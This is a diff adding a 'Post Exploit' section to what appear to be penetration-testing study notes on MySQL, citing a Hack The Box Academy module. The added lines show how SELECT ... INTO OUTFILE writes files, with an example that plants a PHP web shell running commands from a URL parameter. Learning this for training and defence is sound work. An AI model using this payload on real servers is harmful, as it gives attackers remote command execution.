@@ -38,4 +38,16 @@ Automated Tools:
 sudo nmap <ip> -sV -sC -p3306 --script mysql*
 ```
 
+Post Exploit:
+
+In mysql, we can write to local files if we gained access:
+
+Using MySQL to write Local File:
+```
+SELECT "<string_to_be_written_in_file>" INTO OUTFILE '<file_abspath>'
+#Example
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+
 Ref: https://academy.hackthebox.com/app/module/112/section/1238
